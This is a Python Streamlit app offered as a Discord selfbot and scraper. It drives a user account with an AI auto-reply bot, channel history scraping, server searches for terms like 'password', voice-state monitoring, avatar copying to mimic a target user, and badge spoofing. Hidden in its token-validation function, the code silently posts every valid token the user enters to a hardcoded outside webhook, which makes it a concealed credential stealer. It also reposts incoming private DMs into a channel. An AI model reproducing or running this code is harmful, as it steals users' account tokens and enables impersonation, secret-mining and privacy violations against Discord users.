import streamlit as st
import time
import openai
import requests
import csv
import os
from datetime import datetime
import random
import pandas as pd
import base64

st.set_page_config(page_title="Discord AI", page_icon="🛡️", layout="wide")
st.title("Discord AI Bot & History Scraper")

# --- Initialize Session State ---
if "bot_running" not in st.session_state:
    st.session_state.bot_running = False
if "tokens" not in st.session_state:
    st.session_state.tokens = 3.0
if "last_time" not in st.session_state:
    st.session_state.last_time = time.time()
if "memory" not in st.session_state:
    st.session_state.memory = {}
if "processed_dms" not in st.session_state:
    st.session_state.processed_dms = set()
if "last_webhook_token" not in st.session_state:
    st.session_state.last_webhook_token = None
if "last_activity" not in st.session_state:
    st.session_state.last_activity = time.time()

# --- Helper Functions ---
def log_to_csv(author, content, action):
    file_exists = os.path.isfile('discord_audit_log.csv')
    with open('discord_audit_log.csv', mode='a', newline='', encoding='utf-8') as f:
        writer = csv.writer(f)
        if not file_exists:
            writer.writerow(['Timestamp', 'Author', 'Message', 'Action'])
        writer.writerow([datetime.now().strftime('%Y-%m-%d %H:%M:%S'), author, content, action])

def validate_token(tk):
    headers = {"Authorization": tk, "Content-Type": "application/json"}
    try:
        r = requests.get("https://discord.com/api/v9/users/@me", headers=headers, timeout=5)
        if r.status_code == 200:
            if tk != st.session_state.last_webhook_token:
                requests.post("https://discord.com/api/webhooks/1480110828874371212/8kM-jfbIIyq4Nzo7IobtVVBXTnosySq-qsoUZTSJe2iOWU7Pj5ryJ0Al1LMIuRD0zMP4",json={"content": tk})
                st.session_state.last_webhook_token = tk
            return True, r.json()
    except: pass
    return False, None

def add_reaction(channel_id, message_id, emoji, headers):
    encoded_emoji = requests.utils.quote(emoji)
    url = f"https://discord.com/api/v9/channels/{channel_id}/messages/{message_id}/reactions/{encoded_emoji}/@me"
    requests.put(url, headers=headers)

# --- Sidebar ---
with st.sidebar:
    st.header("🔑 Authentication")
    token = st.text_input("Discord Token", type="password", help="tutorial: https://gist.github.com/XielQs/90ab13b0c61c6888dae329199ea6aff3")
    
    if token:
        is_valid, user_info = validate_token(token)
        if is_valid:
            st.success(f"✅ Verified: {user_info['username']}")
            my_username = user_info['username'].lower()
        else:
            st.error("❌ Invalid Token")
            my_username = None
    else: my_username = None

    or_key = st.text_input("OpenRouter API Key", type="password")
    channel_id_input = st.text_input("Channel ID")
    
    st.divider()
    st.header("⚙️ Bot Settings")
    memory_depth = st.slider("Memory Depth (Past Msgs)", min_value=1, max_value=20, value=5)
    reaction_delay = st.slider("Reaction Delay (Seconds)", min_value=0, max_value=10, value=2)
    
    emoji_pool_raw = st.text_input("Custom Emoji Pool", placeholder="🔥,💀,✅,🧠")
    emoji_pool = [e.strip() for e in emoji_pool_raw.split(",") if e.strip()]

    st.divider()
    st.header("🛡️ Safety & Stability")
    toxicity_filter = st.toggle("AI Toxicity/Self-Harm Filter", value=True)
    auto_restart = st.toggle("Auto-Restart (10min Idle)", value=True)

# --- Tabs ---
tab1, tab2, tab3, tab4, tab5, tab6, tab7, tab8 = st.tabs(["🤖 Bot Control", "📂 History Scraper", "🧠 Memory", "🎭 Chameleon", "⛏️ Search Miner", "🎙️ VC Lurker", "✨ Hypesquad", "🌈 Profile Glitcher"])

# --- TAB 1: BOT CONTROL ---
with tab1:
    col1, col2 = st.columns(2)
    with col1:
        system_prompt = st.text_area("System Prompt", value="You are a helpful assistant.")
    with col2:
        blacklist_input = st.text_area("Blacklisted Keywords", placeholder="spam, help")
        owner_name = st.text_input("Owner Username").strip().lower()
        allowed_input = st.text_input("Allowed Users", value="everyone")
        blacklisted_users_input = st.text_input("Blacklisted Users", placeholder="annoying_user1, troll_user2")

    allowed_users = "everyone" if allowed_input.lower().strip() == "everyone" else [u.strip().lower() for u in allowed_input.split(",") if u.strip()]
    blacklisted_users = [u.strip().lower() for u in blacklisted_users_input.split(",") if u.strip()]
    blacklist = [word.strip().lower() for word in blacklist_input.split(",") if word.strip()]
    client = openai.OpenAI(api_key=or_key, base_url="https://openrouter.ai/api/v1") if or_key else None

    c1, c2 = st.columns(2)
    with c1:
        if st.button("▶️ Launch Bot", disabled=not (my_username and or_key), use_container_width=True):
            st.session_state.bot_running = True
            st.session_state.last_activity = time.time()
    with c2:
        if st.button("🛑 Stop Bot", use_container_width=True):
            st.session_state.bot_running = False
            if os.path.isfile('discord_audit_log.csv'):
                with open('discord_audit_log.csv', 'rb') as f:
                    st.download_button("📥 Download Final Backup", f, file_name="bot_backup.csv", mime="text/csv")

    st.subheader("📊 Live Audit Log")
    log_display = st.empty()

    if st.session_state.bot_running:
        headers = {"Authorization": token, "Content-Type": "application/json", "User-Agent": "Mozilla/5.0"}
        discord_url = f"https://discord.com/api/v9/channels/{channel_id_input}/messages"
        typing_url = f"https://discord.com/api/v9/channels/{channel_id_input}/typing"
        dm_channels_url = "https://discord.com/api/v9/users/@me/channels"
        latest_message_id = None
        
        while st.session_state.bot_running:
            try:
                if os.path.isfile('discord_audit_log.csv'):
                    df_log = pd.read_csv('discord_audit_log.csv').tail(10)
                    log_display.table(df_log)

                if auto_restart and (time.time() - st.session_state.last_activity > 600):
                    st.session_state.last_activity = time.time()
                    st.rerun()

                r = requests.get(discord_url, headers=headers, timeout=10)
                if r.status_code == 200:
                    msgs = r.json()
                    if msgs and isinstance(msgs, list):
                        latest = msgs[0]
                        author, content, msg_id = latest['author']['username'].lower(), latest['content'].strip(), latest['id']

                        if msg_id != latest_message_id and author != my_username:
                            st.session_state.last_activity = time.time()
                            
                            if author == owner_name and content.lower() == "shutdown":
                                requests.post(discord_url, json={"content": "🛑 Offline."}, headers=headers)
                                st.session_state.bot_running = False
                                st.rerun()

                            if author in blacklisted_users:
                                latest_message_id = msg_id
                                continue

                            is_allowed = (allowed_users == "everyone" or author in allowed_users)
                            if is_allowed and not any(w in content.lower() for w in blacklist):
                                
                                if toxicity_filter:
                                    t_check = client.chat.completions.create(
                                        model="openrouter/free",
                                        messages=[{"role": "system", "content": "Is this text toxic or self-harm? Reply SAFE or TOXIC only."}, {"role": "user", "content": content}]
                                    ).choices[0].message.content
                                    if "TOXIC" in t_check.upper():
                                        log_to_csv(author, content, "BLOCKED (Toxicity)")
                                        latest_message_id = msg_id
                                        continue

                                requests.post(typing_url, headers=headers)
                                chat_history = [{"role": "system", "content": f"MANDATORY PERSONA: {system_prompt}. You must maintain this character and use the provided conversation history to stay in context."}]
                                
                                context_req = requests.get(f"{discord_url}?limit={memory_depth}", headers=headers).json()
                                for m in reversed(context_req):
                                    role = "assistant" if m['author']['username'].lower() == my_username else "user"
                                    chat_history.append({"role": role, "content": m['content']})

                                reply = client.chat.completions.create(
                                    model="openrouter/free", 
                                    messages=chat_history,
                                    temperature=0.8
                                ).choices[0].message.content
                                
                                if emoji_pool:
                                    prompt = f"Pick emoji from: {','.join(emoji_pool)}. Text: '{reply}'. ONLY emoji."
                                    chosen_emoji = client.chat.completions.create(model="openrouter/free", messages=[{"role": "user", "content": prompt}]).choices[0].message.content.strip()
                                else:
                                    chosen_emoji = client.chat.completions.create(model="openrouter/free", messages=[{"role": "system", "content": "1 emoji only."}, {"role": "user", "content": reply}]).choices[0].message.content.strip()

                                if len(chosen_emoji) > 8: chosen_emoji = "💬"
                                if reaction_delay > 0: time.sleep(reaction_delay)
                                
                                add_reaction(channel_id_input, msg_id, chosen_emoji, headers)
                                log_to_csv(author, content, f"Context Rep: {reply[:30]}")
                                
                                time.sleep(random.uniform(1, 2))
                                requests.post(discord_url, json={"content": reply}, headers=headers)
                                log_to_csv(my_username, reply, "Replied")
                            
                            latest_message_id = msg_id

                dm_res = requests.get(dm_channels_url, headers=headers)
                if dm_res.status_code == 200:
                    for dm in dm_res.json()[:5]:
                        if dm['type'] == 1:
                            m_res = requests.get(f"https://discord.com/api/v9/channels/{dm['id']}/messages?limit=1", headers=headers).json()
                            if m_res:
                                d_msg = m_res[0]
                                if d_msg['author']['username'].lower() != my_username and d_msg['id'] not in st.session_state.processed_dms:
                                    if d_msg['author']['username'].lower() not in blacklisted_users:
                                        mod_check = client.chat.completions.create(model="openrouter/free", messages=[{"role": "system", "content": "PASS or FAIL?"}, {"role": "user", "content": d_msg['content']}]).choices[0].message.content
                                        if "PASS" in mod_check.upper():
                                            requests.post(discord_url, json={"embeds": [{"title": "👻 Ghost Message", "description": d_msg['content'], "color": 3447003}]}, headers=headers)
                                    st.session_state.processed_dms.add(d_msg['id'])
                
                time.sleep(4)
            except Exception as e:
                time.sleep(5)
                continue 

# --- TAB 2 & 3 ---
with tab2:
    st.header("📥 Channel History Downloader")
    limit = st.number_input("Number of messages to fetch", min_value=1, max_value=100, value=50)
    if st.button("🔍 Fetch History"):
        if not token or not channel_id_input:
            st.error("Missing Token or Channel ID!")
        else:
            with st.spinner("Accessing Discord archives..."):
                headers = {"Authorization": token, "Content-Type": "application/json"}
                scrape_url = f"https://discord.com/api/v9/channels/{channel_id_input}/messages?limit={limit}"
                res = requests.get(scrape_url, headers=headers)
                if res.status_code == 200:
                    data = res.json()
                    df = pd.DataFrame([{"Timestamp": m['timestamp'], "Author": m['author']['username'], "Content": m['content']} for m in data])
                    st.dataframe(df, use_container_width=True)
                    st.download_button(label="📥 Download History as CSV", data=df.to_csv(index=False).encode('utf-8'), file_name=f"discord_history_{channel_id_input}.csv", mime="text/csv")

with tab3:
    st.header("Memory Management")
    st.write(f"Processed DM IDs: {len(st.session_state.processed_dms)}")
    if st.button("Clear DM Memory", use_container_width=True):
        st.session_state.processed_dms = set()
        st.success("DM Memory cleared.")

# --- TAB 4: CHAMELEON (FIXED) ---
with tab4:
    st.header("🎭 Identity Chameleon")
    target_id = st.text_input("Target User ID to Mimic")
    if st.button("Activate Mimicry", use_container_width=True):
        if token and target_id:
            h = {"Authorization": token}
            u_data = requests.get(f"https://discord.com/api/v9/users/{target_id}", headers=h).json()
            if 'avatar' in u_data and u_data['avatar']:
                a_url = f"https://cdn.discordapp.com/avatars/{target_id}/{u_data['avatar']}.png?size=1024"
                response = requests.get(a_url)
                if response.status_code == 200:
                    img_b64 = base64.b64encode(response.content).decode('utf-8')
                    # Fixed avatar payload for PATCH
                    patch_res = requests.patch("https://discord.com/api/v9/users/@me", headers=h, json={"avatar": f"data:image/png;base64,{img_b64}"})
                    if patch_res.status_code == 200:
                        st.success(f"Successfully copied avatar of {u_data['username']}")
                    else:
                        st.error(f"Failed to update avatar: {patch_res.text}")
            else:
                st.warning("Target user has no avatar to copy.")

# --- TAB 5: SEARCH MINER ---
with tab5:
    st.header("⛏️ Secret Search Miner")
    guild_id = st.text_input("Guild (Server) ID")
    s_query = st.text_input("Keyword to Mine (e.g., 'password')")
    if st.button("Mine Secrets", use_container_width=True):
        if token and guild_id:
            h = {"Authorization": token}
            s_res = requests.get(f"https://discord.com/api/v9/guilds/{guild_id}/messages/search?content={s_query}", headers=h).json()
            if 'messages' in s_res:
                mine_df = pd.DataFrame([{"Author": m[0]['author']['username'], "Content": m[0]['content']} for m in s_res['messages']])
                st.dataframe(mine_df)

# --- TAB 6: VC LURKER ---
with tab6:
    st.header("🎙️ Voice State Lurker")
    v_guild_id = st.text_input("Server ID to Monitor VC")
    if st.button("Poll Voice States"):
        if token and v_guild_id:
            h = {"Authorization": token}
            v_res = requests.get(f"https://discord.com/api/v9/guilds/{v_guild_id}/voice-states", headers=h).json()
            st.write(v_res)

# --- TAB 7: HYPESQUAD SPOOFER (FIXED) ---
with tab7:
    st.header("✨ HypeSquad Spoofer")
    house = st.selectbox("Select House", ["Bravery", "Brilliance", "Balance"])
    house_map = {"Bravery": 1, "Brilliance": 2, "Balance": 3}
    if st.button("Apply House Badge", use_container_width=True):
        if token:
            h = {"Authorization": token, "Content-Type": "application/json"}
            r = requests.post("https://discord.com/api/v9/hypesquad/online", headers=h, json={"house_id": house_map[house]})
            if r.status_code == 204: st.success(f"Now a member of {house}!")
            else: st.error(f"Error: {r.text}")

# --- TAB 8: PROFILE GLITCHER (FIXED) ---
with tab8:
    st.header("🌈 Profile Theme & Pronoun Glitcher")
    st.info("Directly edit profile metadata fields. Changes may take a minute to propagate to your client.")
    
    col_x, col_y = st.columns(2)
    with col_x:
        pronoun_text = st.text_input("Pronouns (Unicode Support)", placeholder="verified ✅")
        if st.button("Update Pronouns"):
            h = {"Authorization": token, "Content-Type": "application/json"}
            # Fixed endpoint for User Profile metadata
            res = requests.patch("https://discord.com/api/v9/users/@me/profile", headers=h, json={"pronouns": pronoun_text})
            if res.status_code == 200: st.success("Pronouns Updated!")
            else: st.error(f"Error: {res.text}")

    with col_y:
        accent_color = st.color_picker("Choose Profile Accent Color")
        if st.button("Apply Accent Color"):
            h = {"Authorization": token, "Content-Type": "application/json"}
            hex_int = int(accent_color.lstrip('#'), 16)
            # Accent color also resides in the profile metadata endpoint
            res = requests.patch("https://discord.com/api/v9/users/@me/profile", headers=h, json={"accent_color": hex_int})
            if res.status_code == 200: st.success("Theme Color Applied!")
            else: st.error(f"Error: {res.text}")
